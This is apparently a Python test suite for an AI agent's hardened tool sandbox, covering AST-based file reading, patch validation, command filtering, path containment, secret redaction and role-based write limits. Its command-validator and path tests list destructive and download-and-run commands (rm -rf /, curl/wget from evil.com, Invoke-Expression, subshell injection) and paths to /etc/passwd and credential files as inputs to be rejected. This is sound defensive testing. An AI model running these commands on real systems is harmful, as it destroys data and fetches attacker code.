"""Phase 9 Hardened Tooling, Context Windows & Sandbox Engine Verification Suite.

Comprehensive tests verifying:
1. AST virtualizer extracts full methods (>300 LOC) without raw text truncation.
2. Outline generation correctly indexes nested classes, methods, and functions.
3. Dual-window pagination for large files with structural AST outline metadata.
4. Non-destructive patch application with pre-write syntax validation via py_compile.
5. Grammar validator allows safe PowerShell pipelines while blocking dangerous command injection (rm -rf, format, chained ;).
6. Path traversal attempts (../../etc/passwd, ..\\..\\Windows) are strictly rejected.
7. Sensitive files (.env, .env.local, id_rsa, etc.) cannot be read, edited, or appended.
8. Windows UTF-8 stdout decoding handles multilingual characters and special symbols cleanly.
9. Process timeout cleanly kills hung subprocesses without hanging the test runner.
10. ToolSandboxManager enforces AgentExecutionScope RBAC boundaries and tool constriction.
"""

from __future__ import annotations

import os
from pathlib import Path
import sys
import pytest

from orchestrator.tools.hardened import (
    AgentExecutionScope,
    CommandGrammarValidator,
    FileActionRequest,
    FileObservationResult,
    SymbolOutlineNode,
    TerminalActionRequest,
    TerminalObservationResult,
    TerminalSandboxEngine,
    ToolPermissionLevel,
    ToolSandboxManager,
    WorkspaceFileVirtualizer,
    is_sensitive_filepath,
    sanitize_text_secrets,
)
from orchestrator.tools.workspace_tools import (
    WorkspaceFileAction,
    WorkspaceTerminalAction,
    execute_file_action,
    execute_terminal_action,
    is_hardened_sandbox_enabled,
)


# ==============================================================================
# 1. AST VIRTUALIZER & CONTEXT WINDOWS
# ==============================================================================


class TestASTVirtualizerP9:
    """Tests for WorkspaceFileVirtualizer AST-anchored extraction and windowing."""

    def test_extract_full_method_over_300_loc_without_truncation(self, tmp_path: Path):
        """AST virtualizer must extract a full method (>300 LOC) without legacy 250 LOC truncation."""
        lines = [
            "class DataProcessor:",
            "    def process_large_stream(self, data):",
            '        """Process streaming records across 320 steps."""',
            "        result = []",
        ]
        # Generate 320 distinct statements in the method (each ~20 chars)
        for i in range(320):
            lines.append(f"        result.append({i})")
        lines.append("        return result")
        lines.append("")

        source_code = "\n".join(lines)
        target_file = tmp_path / "stream_processor.py"
        target_file.write_text(source_code, encoding="utf-8")

        virt = WorkspaceFileVirtualizer(tmp_path)
        content, start_ln, end_ln, err = virt.read_ast_symbol(
            target_file, "DataProcessor.process_large_stream"
        )

        assert err is None
        assert content is not None
        assert start_ln == 2
        assert end_ln == 325
        # Verify all lines of the method are present without 250 LOC clamping
        assert "def process_large_stream" in content
        assert "result.append(0)" in content
        assert "result.append(319)" in content
        assert "return result" in content
        # Ensure it was not cut off by 250 LOC legacy boundary
        total_extracted_lines = len(content.splitlines())
        assert total_extracted_lines >= 324

        # Also verify zero-truncation mode with max_chars=None
        content_unclamped, _, _, _ = virt.read_ast_symbol(
            target_file, "DataProcessor.process_large_stream", max_chars=None
        )
        assert content_unclamped is not None
        assert "result.append(319)" in content_unclamped

    def test_outline_generation_nested_classes_methods_and_functions(
        self, tmp_path: Path
    ):
        """Outline generator must recursively index nested classes, inner methods, and functions."""
        code = '''"""Module containing nested class and function hierarchies."""

class OuterService:
    """Outer service class."""
    def outer_method(self, x: int) -> int:
        """Outer method docstring."""
        def inner_helper(y: int) -> int:
            """Inner helper function."""
            return y * 2
        return inner_helper(x)

    class NestedEngine:
        """Nested engine class."""
        def engine_run(self) -> bool:
            """Engine run docstring."""
            return True

def standalone_task(name: str):
    """Standalone task function."""
    def task_worker():
        """Inner worker."""
        pass
    return task_worker()
'''
        file_path = tmp_path / "nested_module.py"
        file_path.write_text(code, encoding="utf-8")

        virt = WorkspaceFileVirtualizer(tmp_path)
        outline_text, outline_nodes, err = virt.generate_outline(file_path)

        assert err is None
        assert outline_nodes is not None
        assert len(outline_nodes) == 2  # OuterService, standalone_task

        # Verify OuterService
        outer_cls = outline_nodes[0]
        assert outer_cls.name == "OuterService"
        assert outer_cls.symbol_type == "class"
        # OuterService should have outer_method and NestedEngine as children
        child_names = [c.name for c in outer_cls.children]
        assert "outer_method" in child_names
        assert "NestedEngine" in child_names

        # Verify NestedEngine
        nested_engine = next(c for c in outer_cls.children if c.name == "NestedEngine")
        assert nested_engine.symbol_type == "class"
        assert len(nested_engine.children) == 1
        assert nested_engine.children[0].name == "engine_run"

        # Verify outer_method contains inner_helper
        outer_method = next(c for c in outer_cls.children if c.name == "outer_method")
        assert outer_method.symbol_type == "method"
        assert any(c.name == "inner_helper" for c in outer_method.children)

        # Verify standalone_task contains task_worker
        standalone = outline_nodes[1]
        assert standalone.name == "standalone_task"
        assert standalone.symbol_type == "function"
        assert any(c.name == "task_worker" for c in standalone.children)

        # Verify outline text renders hierarchical indentation
        assert "Class: OuterService" in outline_text
        assert "NestedEngine" in outline_text
        assert "engine_run" in outline_text

    def test_dual_window_pagination_with_outline_metadata(self, tmp_path: Path):
        """Windowed read must return requested lines, pagination hints, and AST outline metadata."""
        code_lines = [
            f"def function_{i}():\n    return {i}" for i in range(100)
        ]
        target_file = tmp_path / "large_api.py"
        target_file.write_text("\n\n".join(code_lines), encoding="utf-8")

        virt = WorkspaceFileVirtualizer(tmp_path)
        # Window 1: Lines 1-50
        view1, err1 = virt.read_windowed(
            target_file, offset_line=1, limit_lines=50, include_outline=True
        )
        assert err1 is None
        assert view1 is not None
        assert view1.offset_line == 1
        assert view1.limit_lines == 50
        assert view1.has_more_above is False
        assert view1.has_more_below is True
        assert view1.next_offset == 51
        assert view1.outline is not None
        assert len(view1.outline) == 100  # All 100 function nodes indexed

        # Window 2: Lines 51-100
        view2, err2 = virt.read_windowed(
            target_file, offset_line=view1.next_offset, limit_lines=50
        )
        assert err2 is None
        assert view2 is not None
        assert view2.offset_line == 51
        assert view2.has_more_above is True

    def test_non_destructive_patch_with_pre_write_syntax_validation(
        self, tmp_path: Path
    ):
        """Patches that introduce syntax errors must be rejected via py_compile without altering disk."""
        init_code = "def calculate(a: int, b: int) -> int:\n    return a + b\n"
        py_file = tmp_path / "calc.py"
        py_file.write_text(init_code, encoding="utf-8")

        virt = WorkspaceFileVirtualizer(tmp_path)

        # 1. Broken syntax patch must fail and disk remains untouched
        bad_replacement = "    return a + (b *"  # Unclosed parenthesis -> SyntaxError
        ok, msg = virt.atomic_patch(
            py_file,
            target_text="    return a + b",
            replacement_text=bad_replacement,
        )
        assert ok is False
        assert "SyntaxError" in msg or "py_compile" in msg
        # File on disk must retain valid original code
        assert py_file.read_text(encoding="utf-8") == init_code

        # 2. Valid patch must succeed
        valid_replacement = "    return a * b"
        ok_valid, msg_valid = virt.atomic_patch(
            py_file,
            target_text="    return a + b",
            replacement_text=valid_replacement,
        )
        assert ok_valid is True
        assert "return a * b" in py_file.read_text(encoding="utf-8")


# ==============================================================================
# 2. COMMAND GRAMMAR VALIDATOR & PIPELINE SECURITY
# ==============================================================================


class TestCommandGrammarValidatorP9:
    """Tests for grammar-based pipeline parsing and shell escape injection defense."""

    def test_safe_powershell_and_unix_pipelines_allowed(self):
        """Legitimate PowerShell and UNIX pipelines must be validated and authorized."""
        safe_pipelines = [
            'Get-Content file.py | Select-String -Pattern "class"',
            'dir | findstr "test"',
            'cat app.log | grep "ERROR"',
            "Get-ChildItem -Recurse | Measure-Object",
            "Get-Content data.csv | Select-Object -First 10",
            'type log.txt | findstr /i "warning"',
            "ls | grep py",
        ]
        for cmd in safe_pipelines:
            val = CommandGrammarValidator.validate_command(cmd)
            assert val.is_valid is True, f"Expected safe pipeline to be valid: {cmd}, reason: {val.rejection_reason}"
            assert len(val.pipeline_segments) >= 2

    def test_dangerous_command_injection_and_escapes_blocked(self):
        """Dangerous shell escapes, destructive commands, and redirect injection must be blocked."""
        dangerous_commands = [
            ("format C:", "prohibited"),
            ("rm -rf /", "prohibited"),
            ("rm -rf .", "prohibited"),
            ("rm -fr /home", "prohibited"),
            ("pytest tests/ ; rm -rf /", "not permitted"),
            ("git status && calc.exe", "not permitted"),
            ("python -c 'print(1)' || echo fail", "not permitted"),
            ("Get-Content file.txt > output.txt", "redirection"),
            ("cat input.txt >> /etc/passwd", "redirection"),
            ("pytest $(whoami)", "Subshell substitution"),
            ("cat file.txt `rm -rf /`", "Backtick command substitution"),
            ("powershell -Command Invoke-Expression 'evil'", "prohibited"),
            ("iex (Get-Content hack.ps1)", "prohibited"),
            ("Invoke-WebRequest -Uri http://evil.com", "prohibited"),
            ("curl -O http://evil.com/hack.sh", "prohibited"),
            ("wget http://evil.com/payload", "prohibited"),
        ]
        for cmd, reason_keyword in dangerous_commands:
            val = CommandGrammarValidator.validate_command(cmd)
            assert val.is_valid is False, f"Expected command to be rejected: {cmd}"
            assert reason_keyword.lower() in (val.rejection_reason or "").lower()


# ==============================================================================
# 3. PATH TRAVERSAL & SENSITIVE FILE PROTECTION
# ==============================================================================


class TestPathTraversalAndSensitiveFilesP9:
    """Tests for workspace containment, directory traversal, and sensitive file shield."""

    @pytest.mark.parametrize(
        "escape_path",
        [
            "../../etc/passwd",
            "..\\..\\Windows\\System32\\cmd.exe",
            "src/../../../etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "/etc/passwd",
        ],
    )
    def test_path_traversal_attempts_strictly_rejected(
        self, escape_path: str, tmp_path: Path
    ):
        """Path traversal escaping the workspace root must be unconditionally rejected."""
        virt = WorkspaceFileVirtualizer(tmp_path)
        is_valid, resolved, err = virt.resolve_sandbox_path(escape_path)
        assert is_valid is False
        assert "Access denied" in err or "escapes workspace" in err

        action = WorkspaceFileAction(operation="read", path=escape_path)
        obs = execute_file_action(action, base_dir=tmp_path)
        assert obs.is_error is True
        assert obs.success is False

    @pytest.mark.parametrize(
        "sensitive_file",
        [
            ".env",
            ".env.local",
            ".env.production",
            ".env.staging",
            "id_rsa",
            "id_rsa.pub",
            "id_ed25519",
            "credentials.json",
            "server.key",
            "cert.pem",
            "client.pfx",
        ],
    )
    def test_sensitive_files_blocked_from_all_operations(
        self, sensitive_file: str, tmp_path: Path
    ):
        """Sensitive credential and environment files cannot be read, edited, written, or appended."""
        mgr = ToolSandboxManager(workspace_root=tmp_path)

        # 1. Read
        obs_read = mgr.handle_file_action(
            FileActionRequest(operation="read", path=sensitive_file)
        )
        assert obs_read.is_error is True
        assert "Security restriction" in obs_read.message

        # 2. Write
        obs_write = mgr.handle_file_action(
            FileActionRequest(
                operation="write", path=sensitive_file, content="SECRET=1"
            )
        )
        assert obs_write.is_error is True
        assert "Security restriction" in obs_write.message

        # 3. Edit / Patch
        obs_edit = mgr.handle_file_action(
            FileActionRequest(
                operation="edit",
                path=sensitive_file,
                target_text="SECRET",
                replacement_text="PUBLIC",
            )
        )
        assert obs_edit.is_error is True
        assert "Security restriction" in obs_edit.message

        # 4. Append
        obs_append = mgr.handle_file_action(
            FileActionRequest(
                operation="append", path=sensitive_file, content="EXTRA=1"
            )
        )
        assert obs_append.is_error is True
        assert "Security restriction" in obs_append.message


# ==============================================================================
# 4. TERMINAL SANDBOX ENGINE: PROCESS ISOLATION, TIMEOUT & UTF-8
# ==============================================================================


class TestTerminalSandboxEngineP9:
    """Tests for subprocess isolation, tree-kill timeouts, and UTF-8 encoding normalization."""

    def test_windows_utf8_multilingual_stdout_decoding(self, tmp_path: Path):
        """Subprocess output containing Arabic, Asian characters, and symbols must decode without Unicode errors."""
        engine = TerminalSandboxEngine(tmp_path)
        req = TerminalActionRequest(
            command="python -c \"import sys; sys.stdout.buffer.write('— “Quotes” مرحبا بك في أوراجاي 🚀 ├── └──'.encode('utf-8'))\""
        )
        obs = engine.execute(req)

        assert obs.exit_code == 0
        assert "مرحبا بك في أوراجاي" in obs.stdout
        assert "🚀" in obs.stdout

    def test_process_timeout_clean_tree_kill(self, tmp_path: Path):
        """Hung child processes must be forcefully terminated on timeout without blocking test runner."""
        engine = TerminalSandboxEngine(tmp_path)
        # Run a python command that would sleep for 30s with a 1s timeout
        req = TerminalActionRequest(
            command="python -c \"import time; time.sleep(30)\"",
            timeout_seconds=1,
        )
        obs = engine.execute(req)

        assert obs.timed_out is True
        assert obs.exit_code == -1
        assert "timed out after 1 seconds" in obs.stderr
        assert obs.is_error is True

    def test_sanitized_environment_redacts_api_tokens(self, tmp_path: Path):
        """Host API keys must not leak to subprocesses and secrets in stdout must be masked."""
        os.environ["MOCK_ORAGAI_SECRET"] = "secret_key_value_9999"
        engine = TerminalSandboxEngine(tmp_path)

        # 1. Environment masking: verify subprocess cannot see MOCK_ORAGAI_SECRET
        req_env = TerminalActionRequest(
            command='python -c "import os; print(\'LEAKED\' if \'MOCK_ORAGAI_SECRET\' in os.environ else \'SAFE\')"'
        )
        obs_env = engine.execute(req_env)
        assert "SAFE" in obs_env.stdout
        assert "LEAKED" not in obs_env.stdout

        # 2. Output stream masking: verify pattern redaction
        secret_sample = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz12345"
        req_mask = TerminalActionRequest(
            command=f'python -c "print(\'{secret_sample}\')"'
        )
        obs_mask = engine.execute(req_mask)
        assert secret_sample not in obs_mask.stdout
        assert "[REDACTED_API_KEY]" in obs_mask.stdout or "[REDACTED_ANTHROPIC_KEY]" in obs_mask.stdout


# ==============================================================================
# 5. PERSONA RBAC & AGENT EXECUTION SCOPE (P5 INTEGRATION)
# ==============================================================================


class TestToolSandboxManagerRBACP9:
    """Tests for AgentExecutionScope RBAC boundaries and tool constriction."""

    def test_agent_execution_scope_developer_vs_tester(self, tmp_path: Path):
        """Developer scope allows code writes and blocks tests; Tester allows test writes and blocks code."""
        dev_scope = AgentExecutionScope(
            role="developer",
            file_permission=ToolPermissionLevel.RESTRICTED_WRITE,
            allowed_write_prefixes=("orchestrator/", "src/"),
            blocked_write_prefixes=("tests/", "test/"),
        )
        dev_mgr = ToolSandboxManager(workspace_root=tmp_path, scope=dev_scope)

        # Developer trying to write to tests/ -> Rejected
        dev_write_test = dev_mgr.handle_file_action(
            FileActionRequest(
                operation="write", path="tests/test_new.py", content="# test"
            )
        )
        assert dev_write_test.is_error is True
        assert "RBAC Violation" in dev_write_test.message

        # Developer writing to orchestrator/ -> Allowed
        dev_write_code = dev_mgr.handle_file_action(
            FileActionRequest(
                operation="write",
                path="orchestrator/module.py",
                content="def run(): return 1\n",
            )
        )
        assert dev_write_code.success is True

        tester_scope = AgentExecutionScope(
            role="tester",
            file_permission=ToolPermissionLevel.RESTRICTED_WRITE,
            allowed_write_prefixes=("tests/", "test/"),
            blocked_write_prefixes=("orchestrator/", "src/"),
        )
        tester_mgr = ToolSandboxManager(workspace_root=tmp_path, scope=tester_scope)

        # Tester writing to orchestrator/ -> Rejected
        tester_write_code = tester_mgr.handle_file_action(
            FileActionRequest(
                operation="write",
                path="orchestrator/module.py",
                content="def run(): return 1\n",
            )
        )
        assert tester_write_code.is_error is True
        assert "RBAC Violation" in tester_write_code.message

        # Tester writing to tests/ -> Allowed
        tester_write_test = tester_mgr.handle_file_action(
            FileActionRequest(
                operation="write",
                path="tests/test_unit.py",
                content="def test_sample(): assert True\n",
            )
        )
        assert tester_write_test.success is True

    def test_agent_execution_scope_read_only_role(self, tmp_path: Path):
        """Reviewer or Read-Only scope strictly prevents all write and edit operations."""
        reviewer_scope = AgentExecutionScope(
            role="reviewer",
            file_permission=ToolPermissionLevel.READ_ONLY,
        )
        rev_mgr = ToolSandboxManager(workspace_root=tmp_path, scope=reviewer_scope)

        obs = rev_mgr.handle_file_action(
            FileActionRequest(operation="write", path="notes.txt", content="test")
        )
        assert obs.is_error is True
        assert "read-only access" in obs.message

    def test_routing_configuration_enables_hardened_sandbox(self):
        """Verify migration_routing.json has both use_hardened_sandbox and use_ast_virtualizer enabled."""
        assert is_hardened_sandbox_enabled() is True
